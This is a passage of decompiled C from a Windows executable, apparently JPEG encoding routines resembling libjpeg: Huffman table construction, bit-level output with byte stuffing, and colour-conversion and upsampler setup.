  *(undefined4 *)(iVar1 + 0x20) = 0xffffffff;
  return;
}



void __cdecl FUN_00411174(int param_1)

{
  undefined4 *puVar1;
  int iVar2;
  
  puVar1 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0xd0);
  *(undefined4 **)(param_1 + 0x194) = puVar1;
  *puVar1 = &LAB_0040fcb0;
  puVar1[2] = FUN_0040ff18;
  iVar2 = 0;
  do {
    puVar1[iVar2 + 0x13] = 0;
    puVar1[iVar2 + 0x23] = 0;
    iVar2 = iVar2 + 1;
  } while (iVar2 != 0x10);
  *(undefined *)(puVar1 + 0x33) = 0x71;
  return;
}



void FUN_004111d4(void)

{
  int iVar1;
  int in_EAX;
  
  iVar1 = *(int *)(in_EAX + 0x180);
  if (1 < *(int *)(in_EAX + 0x110)) {
    *(undefined4 *)(iVar1 + 0x14) = 1;
    *(undefined4 *)(iVar1 + 0xc) = 0;
    *(undefined4 *)(iVar1 + 0x10) = 0;
    return;
  }
  if (*(int *)(in_EAX + 0x10c) - 1U <= *(uint *)(iVar1 + 8)) {
    *(undefined4 *)(iVar1 + 0x14) = *(undefined4 *)(*(int *)(in_EAX + 0x114) + 0x4c);
    *(undefined4 *)(iVar1 + 0xc) = 0;
    *(undefined4 *)(iVar1 + 0x10) = 0;
    return;
  }
  *(undefined4 *)(iVar1 + 0x14) = *(undefined4 *)(*(int *)(in_EAX + 0x114) + 0xc);
  *(undefined4 *)(iVar1 + 0xc) = 0;
  *(undefined4 *)(iVar1 + 0x10) = 0;
  return;
}



void __cdecl FUN_00411a7c(int param_1,char param_2)

{
  code *pcVar1;
  int iVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  undefined4 uVar6;
  int iVar7;
  int iVar8;
  
  puVar3 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0x68);
  *(undefined4 **)(param_1 + 0x180) = puVar3;
  *puVar3 = &LAB_0041123c;
  if (param_2 != '\0') {
    iVar7 = *(int *)(param_1 + 0x54);
    if (0 < *(int *)(param_1 + 0x4c)) {
      iVar8 = 0;
      do {
        pcVar1 = *(code **)(*(int *)(param_1 + 4) + 0x14);
        iVar2 = *(int *)(iVar7 + 0xc);
        iVar4 = FUN_0040c1b8(*(int *)(iVar7 + 0x20),iVar2);
        iVar5 = FUN_0040c1b8(*(int *)(iVar7 + 0x1c),*(int *)(iVar7 + 8));
        uVar6 = (*pcVar1)(param_1,1,0,iVar5,iVar4,iVar2);
        puVar3[iVar8 + 0x10] = uVar6;
        iVar8 = iVar8 + 1;
        iVar7 = iVar7 + 0x58;
      } while (iVar8 < *(int *)(param_1 + 0x4c));
    }
    return;
  }
  iVar7 = (**(code **)(*(int *)(param_1 + 4) + 4))(param_1,1,0x500);
  iVar8 = 0;
  do {
    puVar3[iVar8 + 6] = iVar7;
    iVar8 = iVar8 + 1;
    iVar7 = iVar7 + 0x80;
  } while (iVar8 != 10);
  puVar3[0x10] = 0;
  return;
}



void __cdecl FUN_00411ca4(int *param_1,char param_2)

{
  code **ppcVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  int iVar4;
  int iVar5;
  
  puVar2 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0x40);
  param_1[0x5e] = (int)puVar2;
  *puVar2 = &LAB_00411c54;
  if (*(char *)(param_1 + 0x34) == '\0') {
    if (param_2 != '\0') {
      ppcVar1 = (code **)*param_1;
      ppcVar1[5] = (code *)0x3;
                    // WARNING: Could not recover jumptable at 0x00411d46. Too many branches
                    // WARNING: Treating indirect jump as call
      (**ppcVar1)();
      return;
    }
    iVar4 = param_1[0x15];
    if (0 < param_1[0x13]) {
      iVar5 = 0;
      do {
        uVar3 = (**(code **)(param_1[1] + 8))
                          (param_1,1,*(int *)(iVar4 + 0x24) * *(int *)(iVar4 + 0x1c),
                           *(int *)(iVar4 + 0xc) * *(int *)(iVar4 + 0x28));
        puVar2[iVar5 + 6] = uVar3;
        iVar5 = iVar5 + 1;
        iVar4 = iVar4 + 0x58;
      } while (iVar5 < param_1[0x13]);
    }
  }
  return;
}



void FUN_00411d48(void)

{
  undefined4 *puVar1;
  int *piVar2;
  code **ppcVar3;
  char cVar4;
  int in_EAX;
  
  puVar1 = *(undefined4 **)(*(int *)(in_EAX + 0x78) + 0x18);
  cVar4 = (*(code *)puVar1[3])(*(int *)(in_EAX + 0x78));
  if (cVar4 == '\0') {
    piVar2 = *(int **)(in_EAX + 0x78);
    ppcVar3 = (code **)*piVar2;
    ppcVar3[5] = (code *)0x19;
    (**ppcVar3)(piVar2);
  }
  *(undefined4 *)(in_EAX + 0x70) = *puVar1;
  *(undefined4 *)(in_EAX + 0x74) = puVar1[1];
  return;
}



void __fastcall FUN_00411f94(uint param_1,char param_2,int *param_3)

{
  byte bVar1;
  int iVar2;
  code **ppcVar3;
  char cVar4;
  int *in_EAX;
  char *pcVar5;
  int iVar6;
  char *pcVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  uint uVar12;
  int iVar13;
  int iVar14;
  undefined *puVar15;
  int local_548;
  byte local_53c;
  int local_534;
  int local_524 [257];
  char local_11d [269];
  
  if (3 < param_1) {
    iVar2 = *in_EAX;
    *(undefined4 *)(iVar2 + 0x14) = 0x34;
    *(uint *)(iVar2 + 0x18) = param_1;
    (**(code **)*in_EAX)();
  }
  if (param_2 == '\0') {
    iVar2 = in_EAX[param_1 + 0x22];
  }
  else {
    iVar2 = in_EAX[param_1 + 0x1e];
  }
  if (iVar2 == 0) {
    iVar10 = *in_EAX;
    *(undefined4 *)(iVar10 + 0x14) = 0x34;
    *(uint *)(iVar10 + 0x18) = param_1;
    (**(code **)*in_EAX)(in_EAX);
    local_534 = *param_3;
  }
  else {
    local_534 = *param_3;
  }
  if (local_534 == 0) {
    local_534 = (**(code **)in_EAX[1])(in_EAX,1,0x500);
    *param_3 = local_534;
  }
  iVar8 = 1;
  iVar10 = 0;
  do {
    bVar1 = *(byte *)(iVar2 + iVar8);
    uVar12 = (uint)bVar1;
    if (0x100 < (int)(iVar10 + uVar12)) {
      ppcVar3 = (code **)*in_EAX;
      ppcVar3[5] = (code *)0x9;
      (**ppcVar3)(in_EAX);
    }
    if (uVar12 != 0) {
      pcVar5 = local_11d + iVar10;
      pcVar7 = pcVar5 + bVar1;
      do {
        *pcVar5 = (char)iVar8;
        pcVar5 = pcVar5 + 1;
      } while (pcVar5 != pcVar7);
      iVar10 = iVar10 + uVar12;
    }
    iVar8 = iVar8 + 1;
  } while (iVar8 != 0x11);
  local_11d[iVar10] = '\0';
  if (local_11d[0] != '\0') {
    iVar9 = 0;
    iVar11 = 0;
    iVar13 = (int)local_11d[0];
    cVar4 = local_11d[0];
    iVar8 = (int)local_11d[0];
    do {
      local_548 = iVar8 + 1;
      iVar14 = iVar13;
      if (iVar13 == iVar8) {
        iVar6 = iVar11 - iVar9;
        do {
          local_524[iVar6 + iVar9] = iVar9;
          iVar11 = iVar11 + 1;
          iVar9 = iVar9 + 1;
          cVar4 = local_11d[iVar9 + iVar6];
          iVar14 = (int)cVar4;
        } while (iVar14 == iVar13);
      }
      local_53c = (byte)iVar8;
      if (1 << (local_53c & 0x1f) <= iVar9) {
        ppcVar3 = (code **)*in_EAX;
        ppcVar3[5] = (code *)0x9;
        (**ppcVar3)(in_EAX);
      }
      iVar9 = iVar9 << 1;
      iVar13 = iVar14;
      iVar8 = local_548;
    } while (cVar4 != '\0');
  }
  puVar15 = (undefined *)(local_534 + 0x400);
  for (iVar8 = 0x100; iVar8 != 0; iVar8 = iVar8 + -1) {
    *puVar15 = 0;
    puVar15 = puVar15 + 1;
  }
  if (iVar10 != 0) {
    iVar8 = 0;
    cVar4 = local_11d[0];
    while( true ) {
      uVar12 = (uint)*(byte *)(iVar2 + 0x11 + iVar8);
      if (((-(uint)(param_2 == '\0') & 0xf0) + 0xf < uVar12) ||
         (*(char *)(local_534 + 0x400 + uVar12) != '\0')) {
        ppcVar3 = (code **)*in_EAX;
        ppcVar3[5] = (code *)0x9;
        (**ppcVar3)(in_EAX);
      }
      *(int *)(local_534 + uVar12 * 4) = local_524[iVar8];
      *(char *)(local_534 + 0x400 + uVar12) = cVar4;
      if (iVar8 + 1 == iVar10) break;
      cVar4 = local_11d[iVar8 + 1];
      iVar8 = iVar8 + 1;
    }
  }
  return;
}



void __fastcall FUN_004124b4(int param_1,undefined *param_2)

{
  int *piVar1;
  char cVar2;
  int iVar3;
  code **ppcVar4;
  int *in_EAX;
  int *piVar5;
  int iVar6;
  int iVar7;
  char cVar8;
  char *pcVar9;
  undefined *puVar10;
  int iVar11;
  undefined *puVar12;
  int local_858;
  int local_848 [257];
  int local_444 [257];
  undefined4 local_40;
  char acStack_3c [14];
  char acStack_2e [30];
  
  puVar10 = (undefined *)((int)&local_40 + 3);
  puVar12 = puVar10;
  for (iVar7 = 0x21; iVar7 != 0; iVar7 = iVar7 + -1) {
    *puVar12 = 0;
    puVar12 = puVar12 + 1;
  }
  piVar5 = local_848;
  for (iVar7 = 0x404; iVar7 != 0; iVar7 = iVar7 + -1) {
    *(undefined *)piVar5 = 0;
    piVar5 = (int *)((int)piVar5 + 1);
  }
  piVar5 = local_444;
  do {
    *piVar5 = -1;
    piVar5 = piVar5 + 1;
  } while (piVar5 != &local_40);
  *(undefined4 *)(param_1 + 0x400) = 1;
  do {
    do {
      iVar11 = 1000000000;
      iVar6 = 0;
      iVar7 = -1;
      do {
        iVar3 = *(int *)(param_1 + iVar6 * 4);
        if ((iVar3 != 0) && (iVar3 <= iVar11)) {
          iVar7 = iVar6;
          iVar11 = iVar3;
        }
        iVar6 = iVar6 + 1;
      } while (iVar6 != 0x101);
      iVar11 = 1000000000;
      iVar6 = 0;
      local_858 = -1;
      do {
        iVar3 = *(int *)(param_1 + iVar6 * 4);
        if (((iVar3 != 0) && (iVar3 <= iVar11)) && (iVar6 != iVar7)) {
          iVar11 = iVar3;
          local_858 = iVar6;
        }
        iVar6 = iVar6 + 1;
      } while (iVar6 != 0x101);
      piVar5 = local_848;
      if (local_858 < 0) {
        do {
          iVar7 = *piVar5;
          if (iVar7 != 0) {
            if (0x20 < iVar7) {
              ppcVar4 = (code **)*in_EAX;
              ppcVar4[5] = (code *)0x28;
              (**ppcVar4)(in_EAX);
            }
            acStack_3c[iVar7 + -1] = acStack_3c[iVar7 + -1] + '\x01';
          }
          piVar5 = piVar5 + 1;
        } while (piVar5 != local_444);
        iVar7 = 0x1e;
        do {
          pcVar9 = acStack_3c + iVar7 + 1;
          cVar8 = *pcVar9;
          if (cVar8 != '\0') {
            do {
              cVar2 = puVar10[iVar7];
              iVar11 = iVar7;
              while (cVar2 == '\0') {
                iVar11 = iVar11 + -1;
                cVar2 = puVar10[iVar11];
              }
              *pcVar9 = cVar8 + -2;
              acStack_3c[iVar7] = acStack_3c[iVar7] + '\x01';
              acStack_3c[iVar11] = acStack_3c[iVar11] + '\x02';
              acStack_3c[iVar11 + -1] = acStack_3c[iVar11 + -1] + -1;
              cVar8 = *pcVar9;
            } while (cVar8 != '\0');
          }
          iVar7 = iVar7 + -1;
        } while (iVar7 != 0xe);
        iVar7 = 0x10;
        while (acStack_2e[1] == '\0') {
          iVar7 = iVar7 + -1;
          acStack_2e[1] = puVar10[iVar7];
        }
        acStack_3c[iVar7 + -1] = acStack_2e[1] + -1;
        puVar12 = param_2;
        for (iVar7 = 0x11; iVar7 != 0; iVar7 = iVar7 + -1) {
          *puVar12 = *puVar10;
          puVar10 = puVar10 + 1;
          puVar12 = puVar12 + 1;
        }
        iVar11 = 1;
        iVar7 = 0;
        do {
          iVar6 = 0;
          do {
            while (local_848[iVar6] != iVar11) {
              iVar6 = iVar6 + 1;
              if (iVar6 == 0x100) goto LAB_004126d6;
            }
            param_2[iVar7 + 0x11] = (char)iVar6;
            iVar7 = iVar7 + 1;
            iVar6 = iVar6 + 1;
          } while (iVar6 != 0x100);
LAB_004126d6:
          iVar11 = iVar11 + 1;
          if (iVar11 == 0x21) {
            param_2[0x111] = 0;
            return;
          }
        } while( true );
      }
      piVar5 = (int *)(param_1 + local_858 * 4);
      piVar1 = (int *)(param_1 + iVar7 * 4);
      *piVar1 = *piVar1 + *piVar5;
      *piVar5 = 0;
      local_848[iVar7] = local_848[iVar7] + 1;
      iVar11 = local_444[iVar7];
      while (iVar6 = iVar11, -1 < iVar6) {
        local_848[iVar6] = local_848[iVar6] + 1;
        iVar7 = iVar6;
        iVar11 = local_444[iVar6];
      }
      local_444[iVar7] = local_858;
      local_848[local_858] = local_848[local_858] + 1;
      iVar7 = local_444[local_858];
    } while (iVar7 < 0);
    do {
      local_848[iVar7] = local_848[iVar7] + 1;
      iVar7 = local_444[iVar7];
      if (iVar7 < 0) break;
      local_848[iVar7] = local_848[iVar7] + 1;
      iVar7 = local_444[iVar7];
    } while (-1 < iVar7);
  } while( true );
}



void FUN_004126f0(void)

{
  int *piVar1;
  byte bVar2;
  undefined *puVar3;
  int iVar4;
  code **ppcVar5;
  char cVar6;
  int in_EAX;
  int iVar7;
  int iVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  uint local_24;
  byte *local_20;
  
  if (*(int *)(in_EAX + 0x80) == 0) {
    return;
  }
  iVar7 = *(int *)(in_EAX + 0x80) >> 1;
  if (iVar7 == 0) {
    iVar7 = 0;
    iVar8 = 0;
  }
  else {
    iVar8 = 0;
    do {
      iVar8 = iVar8 + 1;
      iVar7 = iVar7 >> 1;
    } while (iVar7 != 0);
    if (0xe < iVar8) {
      piVar1 = *(int **)(in_EAX + 0x78);
      ppcVar5 = (code **)*piVar1;
      ppcVar5[5] = (code *)0x29;
      (**ppcVar5)(piVar1);
    }
    iVar7 = iVar8 * 0x10;
  }
  if (*(char *)(in_EAX + 0x6c) == '\0') {
    iVar4 = *(int *)(in_EAX + 0x3c + *(int *)(in_EAX + 0x7c) * 4);
    bVar2 = *(byte *)(iVar4 + 0x400 + iVar7);
    uVar10 = *(uint *)(iVar4 + iVar7 * 4);
    iVar7 = *(int *)(in_EAX + 0x10);
    if ((char)bVar2 == 0) {
      piVar1 = *(int **)(in_EAX + 0x78);
      ppcVar5 = (code **)*piVar1;
      ppcVar5[5] = (code *)0x29;
      (**ppcVar5)(piVar1);
      cVar6 = *(char *)(in_EAX + 0x6c);
      if (cVar6 != '\0') goto joined_r0x0041291c;
    }
    local_24 = iVar7 + (char)bVar2;
    uVar9 = ((1 << (bVar2 & 0x1f)) - 1U & uVar10) << (0x18U - (char)local_24 & 0x1f) |
            *(uint *)(in_EAX + 0xc);
    uVar10 = local_24;
    if (7 < (int)local_24) {
      do {
        while( true ) {
          uVar11 = uVar9;
          puVar3 = *(undefined **)(in_EAX + 0x70);
          *puVar3 = (char)(uVar11 >> 0x10);
          *(undefined **)(in_EAX + 0x70) = puVar3 + 1;
          iVar7 = *(int *)(in_EAX + 0x74) + -1;
          *(int *)(in_EAX + 0x74) = iVar7;
          if (iVar7 == 0) {
            FUN_00411d48();
          }
          if (((int)uVar11 >> 0x10 & 0xffU) == 0xff) break;
LAB_004128a0:
          uVar10 = uVar10 - 8;
          uVar9 = uVar11 << 8;
          if ((int)uVar10 < 8) goto LAB_00412908;
        }
        puVar3 = *(undefined **)(in_EAX + 0x70);
        *puVar3 = 0;
        *(undefined **)(in_EAX + 0x70) = puVar3 + 1;
        iVar7 = *(int *)(in_EAX + 0x74) + -1;
        *(int *)(in_EAX + 0x74) = iVar7;
        if (iVar7 != 0) goto LAB_004128a0;
        FUN_00411d48();
        uVar10 = uVar10 - 8;
        uVar9 = uVar11 << 8;
      } while (7 < (int)uVar10);
LAB_00412908:
      uVar9 = uVar11 << 8;
      local_24 = local_24 & 7;
    }
    *(uint *)(in_EAX + 0xc) = uVar9;
    *(uint *)(in_EAX + 0x10) = local_24;
    cVar6 = *(char *)(in_EAX + 0x6c);
  }
  else {
    piVar1 = (int *)(*(int *)(in_EAX + 0x5c + *(int *)(in_EAX + 0x7c) * 4) + iVar7 * 4);
    *piVar1 = *piVar1 + 1;
    cVar6 = *(char *)(in_EAX + 0x6c);
  }
joined_r0x0041291c:
  if (iVar8 != 0) {
    if (cVar6 != '\0') {
      *(undefined4 *)(in_EAX + 0x80) = 0;
      goto LAB_00412844;
    }
    uVar9 = iVar8 + *(int *)(in_EAX + 0x10);
    uVar11 = ((1 << ((byte)iVar8 & 0x1f)) - 1U & *(uint *)(in_EAX + 0x80)) <<
             (0x18U - (char)uVar9 & 0x1f) | *(uint *)(in_EAX + 0xc);
    cVar6 = '\0';
    uVar10 = uVar9;
    if (7 < (int)uVar9) {
      do {
        puVar3 = *(undefined **)(in_EAX + 0x70);
        *puVar3 = (char)(uVar11 >> 0x10);
        *(undefined **)(in_EAX + 0x70) = puVar3 + 1;
        iVar7 = *(int *)(in_EAX + 0x74) + -1;
        *(int *)(in_EAX + 0x74) = iVar7;
        if (iVar7 == 0) {
          FUN_00411d48();
        }
        if (((int)uVar11 >> 0x10 & 0xffU) == 0xff) {
          puVar3 = *(undefined **)(in_EAX + 0x70);
          *puVar3 = 0;
          *(undefined **)(in_EAX + 0x70) = puVar3 + 1;
          iVar7 = *(int *)(in_EAX + 0x74) + -1;
          *(int *)(in_EAX + 0x74) = iVar7;
          if (iVar7 == 0) {
            FUN_00411d48();
          }
        }
        uVar11 = uVar11 << 8;
        uVar10 = uVar10 - 8;
      } while (7 < (int)uVar10);
      uVar9 = uVar9 & 7;
      cVar6 = *(char *)(in_EAX + 0x6c);
    }
    *(uint *)(in_EAX + 0xc) = uVar11;
    *(uint *)(in_EAX + 0x10) = uVar9;
  }
  *(undefined4 *)(in_EAX + 0x80) = 0;
  local_24 = *(int *)(in_EAX + 0x84);
  local_20 = *(byte **)(in_EAX + 0x88);
  if ((cVar6 == '\0') && (cVar6 = '\0', local_24 != 0)) {
    do {
      iVar7 = *(int *)(in_EAX + 0x10);
      if (cVar6 == '\0') {
        uVar10 = iVar7 + 1;
        uVar9 = (*local_20 & 1) << (0x17U - (char)iVar7 & 0x1f) | *(uint *)(in_EAX + 0xc);
        if (7 < (int)uVar10) {
          do {
            while( true ) {
              uVar11 = uVar9;
              puVar3 = *(undefined **)(in_EAX + 0x70);
              *puVar3 = (char)(uVar11 >> 0x10);
              *(undefined **)(in_EAX + 0x70) = puVar3 + 1;
              iVar8 = *(int *)(in_EAX + 0x74) + -1;
              *(int *)(in_EAX + 0x74) = iVar8;
              if (iVar8 == 0) {
                FUN_00411d48();
              }
              if (((int)uVar11 >> 0x10 & 0xffU) == 0xff) break;
LAB_004127b4:
              uVar10 = uVar10 - 8;
              uVar9 = uVar11 << 8;
              if ((int)uVar10 < 8) goto LAB_0041281c;
            }
            puVar3 = *(undefined **)(in_EAX + 0x70);
            *puVar3 = 0;
            *(undefined **)(in_EAX + 0x70) = puVar3 + 1;
            iVar8 = *(int *)(in_EAX + 0x74) + -1;
            *(int *)(in_EAX + 0x74) = iVar8;
            if (iVar8 != 0) goto LAB_004127b4;
            FUN_00411d48();
            uVar10 = uVar10 - 8;
            uVar9 = uVar11 << 8;
          } while (7 < (int)uVar10);
LAB_0041281c:
          uVar9 = uVar11 << 8;
          uVar10 = iVar7 - 7U & 7;
        }
        *(uint *)(in_EAX + 0xc) = uVar9;
        *(uint *)(in_EAX + 0x10) = uVar10;
      }
      local_24 = local_24 + -1;
      if (local_24 == 0) break;
      local_20 = local_20 + 1;
      cVar6 = *(char *)(in_EAX + 0x6c);
    } while( true );
  }
LAB_00412844:
  *(undefined4 *)(in_EAX + 0x84) = 0;
  return;
}



void __fastcall FUN_00412b34(undefined4 param_1,char param_2)

{
  undefined *puVar1;
  int in_EAX;
  int iVar2;
  char *pcVar3;
  uint uVar4;
  int iVar5;
  
  FUN_004126f0();
  if (*(char *)(in_EAX + 0x6c) == '\0') {
    iVar5 = *(int *)(in_EAX + 0x10) + 7;
    if (7 < iVar5) {
      uVar4 = 0x7f << (0x11U - (char)*(int *)(in_EAX + 0x10) & 0x1f) | *(uint *)(in_EAX + 0xc);
      do {
        while( true ) {
          puVar1 = *(undefined **)(in_EAX + 0x70);
          *puVar1 = (char)(uVar4 >> 0x10);
          *(undefined **)(in_EAX + 0x70) = puVar1 + 1;
          iVar2 = *(int *)(in_EAX + 0x74) + -1;
          *(int *)(in_EAX + 0x74) = iVar2;
          if (iVar2 == 0) {
            FUN_00411d48();
          }
          if (((int)uVar4 >> 0x10 & 0xffU) == 0xff) break;
LAB_00412bc0:
          uVar4 = uVar4 << 8;
          iVar5 = iVar5 + -8;
          if (iVar5 < 8) goto LAB_00412c28;
        }
        puVar1 = *(undefined **)(in_EAX + 0x70);
        *puVar1 = 0;
        *(undefined **)(in_EAX + 0x70) = puVar1 + 1;
        iVar2 = *(int *)(in_EAX + 0x74) + -1;
        *(int *)(in_EAX + 0x74) = iVar2;
        if (iVar2 != 0) goto LAB_00412bc0;
        FUN_00411d48();
        uVar4 = uVar4 << 8;
        iVar5 = iVar5 + -8;
      } while (7 < iVar5);
    }
LAB_00412c28:
    *(undefined4 *)(in_EAX + 0xc) = 0;
    *(undefined4 *)(in_EAX + 0x10) = 0;
    puVar1 = *(undefined **)(in_EAX + 0x70);
    *puVar1 = 0xff;
    pcVar3 = puVar1 + 1;
    *(char **)(in_EAX + 0x70) = pcVar3;
    iVar5 = *(int *)(in_EAX + 0x74) + -1;
    *(int *)(in_EAX + 0x74) = iVar5;
    if (iVar5 == 0) {
      FUN_00411d48();
      pcVar3 = *(char **)(in_EAX + 0x70);
    }
    *pcVar3 = param_2 + -0x30;
    *(char **)(in_EAX + 0x70) = pcVar3 + 1;
    iVar5 = *(int *)(in_EAX + 0x74) + -1;
    *(int *)(in_EAX + 0x74) = iVar5;
    if (iVar5 == 0) {
      FUN_00411d48();
    }
  }
  if (*(int *)(*(int *)(in_EAX + 0x78) + 0x158) == 0) {
    iVar5 = *(int *)(*(int *)(in_EAX + 0x78) + 0x110);
    if (0 < iVar5) {
      iVar2 = 0;
      do {
        *(undefined4 *)(in_EAX + 0x14 + iVar2 * 4) = 0;
        iVar2 = iVar2 + 1;
      } while (iVar2 != iVar5);
    }
    return;
  }
  *(undefined4 *)(in_EAX + 0x80) = 0;
  *(undefined4 *)(in_EAX + 0x84) = 0;
  return;
}



void __cdecl FUN_004148e4(int param_1)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 *puVar3;
  
  puVar1 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0x8c);
  *(undefined4 **)(param_1 + 0x194) = puVar1;
  *puVar1 = &LAB_00412204;
  iVar2 = 0;
  puVar3 = puVar1;
  do {
    puVar3[0xf] = 0;
    puVar3[0xb] = 0;
    puVar3[0x17] = 0;
    puVar3[0x13] = 0;
    iVar2 = iVar2 + 1;
    puVar3 = puVar3 + 1;
  } while (iVar2 != 4);
  if (*(char *)(param_1 + 0xf8) != '\0') {
    puVar1[0x22] = 0;
  }
  return;
}



void __cdecl FUN_00414ea4(int *param_1)

{
  code **ppcVar1;
  int iVar2;
  undefined4 *puVar3;
  
  puVar3 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0xc);
  param_1[0x62] = (int)puVar3;
  *puVar3 = &DAT_00414ea0;
  switch(param_1[10]) {
  default:
    if (param_1[9] < 1) {
LAB_00414f26:
      ppcVar1 = (code **)*param_1;
      ppcVar1[5] = (code *)0xa;
      (**ppcVar1)(param_1);
    }
    break;
  case 1:
    if (param_1[9] != 1) goto LAB_00414f26;
    break;
  case 2:
  case 3:
    if (param_1[9] != 3) goto LAB_00414f26;
    break;
  case 4:
  case 5:
    if (param_1[9] != 4) goto LAB_00414f26;
  }
  switch(param_1[0x14]) {
  default:
    if ((param_1[0x14] != param_1[10]) || (param_1[0x13] != param_1[9])) {
      ppcVar1 = (code **)*param_1;
      ppcVar1[5] = (code *)0x1c;
      (**ppcVar1)(param_1);
    }
    break;
  case 1:
    if (param_1[0x13] != 1) {
      ppcVar1 = (code **)*param_1;
      ppcVar1[5] = (code *)0xb;
      (**ppcVar1)(param_1);
    }
    iVar2 = param_1[10];
    if ((iVar2 == 1) || (iVar2 == 3)) {
      puVar3[1] = &LAB_00414d1c;
      return;
    }
    if (iVar2 == 2) {
      *puVar3 = &LAB_00414954;
      puVar3[1] = &LAB_00414b38;
      return;
    }
    goto LAB_00414fdc;
  case 2:
    if (param_1[0x13] != 3) {
      ppcVar1 = (code **)*param_1;
      ppcVar1[5] = (code *)0xb;
      (**ppcVar1)(param_1);
    }
    if (param_1[10] == 2) {
      puVar3[1] = &LAB_00414d80;
      return;
    }
LAB_00414fdc:
    ppcVar1 = (code **)*param_1;
    ppcVar1[5] = (code *)0x1c;
                    // WARNING: Could not recover jumptable at 0x00414ff0. Too many branches
                    // WARNING: Treating indirect jump as call
    (**ppcVar1)();
    return;
  case 3:
    if (param_1[0x13] != 3) {
      ppcVar1 = (code **)*param_1;
      ppcVar1[5] = (code *)0xb;
      (**ppcVar1)(param_1);
    }
    if (param_1[10] == 2) {
      *puVar3 = &LAB_00414954;
      puVar3[1] = &LAB_00414a28;
      return;
    }
    if (param_1[10] != 3) goto LAB_00414fdc;
    break;
  case 4:
    if (param_1[0x13] != 4) {
      ppcVar1 = (code **)*param_1;
      ppcVar1[5] = (code *)0xb;
      (**ppcVar1)(param_1);
    }
    if (param_1[10] != 4) goto LAB_00414fdc;
    break;
  case 5:
    if (param_1[0x13] != 4) {
      ppcVar1 = (code **)*param_1;
      ppcVar1[5] = (code *)0xb;
      (**ppcVar1)(param_1);
    }
    if (param_1[10] == 4) {
      *puVar3 = &LAB_00414954;
      puVar3[1] = &LAB_00414bdc;
      return;
    }
    if (param_1[10] != 5) goto LAB_00414fdc;
  }
  puVar3[1] = &LAB_00414e18;
  return;
}



int __fastcall FUN_00415088(int param_1,int param_2,int param_3)

{
  undefined *puVar1;
  undefined uVar2;
  int in_EAX;
  undefined *puVar3;
  int iVar4;
  
  if ((0 < param_3 - param_1) && (0 < param_2)) {
    iVar4 = 0;
    do {
      puVar3 = (undefined *)(*(int *)(in_EAX + iVar4 * 4) + param_1);
      uVar2 = puVar3[-1];
      puVar1 = puVar3 + (param_3 - param_1);
      do {
        *puVar3 = uVar2;
        puVar3 = puVar3 + 1;
      } while (puVar3 != puVar1);
      iVar4 = iVar4 + 1;
    } while (iVar4 != param_2);
  }
  return param_2;
}



void __cdecl FUN_004158f8(int *param_1)

{
  int iVar1;
  int iVar2;
  code **ppcVar3;
  bool bVar4;
  undefined4 *puVar5;
  int iVar6;
  int iVar7;
  undefined4 *puVar8;
  int iVar9;
  int iStack_30;
  undefined4 *puStack_28;
  
  puVar5 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0x70);
  param_1[99] = (int)puVar5;
  *puVar5 = &DAT_00415084;
  puVar5[1] = &LAB_004150c4;
  *(undefined *)(puVar5 + 2) = 0;
  if (*(char *)((int)param_1 + 0xd3) != '\0') {
    ppcVar3 = (code **)*param_1;
    ppcVar3[5] = (code *)0x1a;
    (**ppcVar3)(param_1);
  }
  iVar9 = param_1[0x15];
  if (param_1[0x13] < 1) {
    bVar4 = true;
  }
  else {
    bVar4 = true;
    iStack_30 = 0;
    puVar8 = puVar5;
    puStack_28 = puVar5;
    do {
      iVar6 = (*(int *)(iVar9 + 8) * *(int *)(iVar9 + 0x24)) / param_1[0x41];
      iVar7 = (*(int *)(iVar9 + 0xc) * *(int *)(iVar9 + 0x28)) / param_1[0x42];
      iVar1 = param_1[0x3f];
      iVar2 = param_1[0x40];
      puVar8[0xd] = iVar7;
      if ((iVar1 == iVar6) && (iVar2 == iVar7)) {
        if (param_1[0x36] == 0) {
          puVar8[3] = &LAB_00415894;
        }
        else {
          puVar8[3] = &LAB_004156d8;
          *(undefined *)(puVar5 + 2) = 1;
        }
      }
      else if (iVar6 * 2 == iVar1) {
        if (iVar2 == iVar7) {
          puVar8[3] = &LAB_00415280;
          bVar4 = false;
        }
        else {
          if (iVar7 * 2 != iVar2) goto LAB_00415973;
          if (param_1[0x36] == 0) {
            puVar8[3] = &LAB_00415324;
          }
          else {
            puVar8[3] = &LAB_004153e8;
            *(undefined *)(puVar5 + 2) = 1;
          }
        }
      }
      else {
LAB_00415973:
        if ((iVar1 % iVar6 == 0) && (iVar2 % iVar7 == 0)) {
          puVar8[3] = &LAB_00415138;
          *(char *)(puStack_28 + 0x17) = (char)(iVar1 / iVar6);
          *(char *)((int)puStack_28 + 0x66) = (char)(iVar2 / iVar7);
          bVar4 = false;
        }
        else {
          ppcVar3 = (code **)*param_1;
          ppcVar3[5] = (code *)0x27;
          (**ppcVar3)(param_1);
        }
      }
      iStack_30 = iStack_30 + 1;
      iVar9 = iVar9 + 0x58;
      puVar8 = puVar8 + 1;
      puStack_28 = (undefined4 *)((int)puStack_28 + 1);
    } while (iStack_30 < param_1[0x13]);
  }
  if ((param_1[0x36] != 0) && (!bVar4)) {
    iVar9 = *param_1;
    *(undefined4 *)(iVar9 + 0x14) = 0x65;
    (**(code **)(iVar9 + 4))(param_1,0);
    return;
  }
  return;
}



void __fastcall FUN_00415b40(int param_1,int param_2,int param_3)

{
  int iVar1;
  int in_EAX;
  
  if (param_1 < param_3) {
    iVar1 = param_1 + -1;
    do {
      FUN_0040c1d0(in_EAX,iVar1,in_EAX,param_1,1,param_2);
      param_1 = param_1 + 1;
    } while (param_1 != param_3);
  }
  return;
}



void __cdecl FUN_00415ef8(int *param_1,char param_2)

{
  code **ppcVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  undefined *puVar4;
  int iVar5;
  undefined *puVar6;
  int iVar7;
  undefined *puVar8;
  int iVar9;
  undefined *puVar10;
  int iStack_44;
  int iStack_40;
  
  if (param_2 != '\0') {
    ppcVar1 = (code **)*param_1;
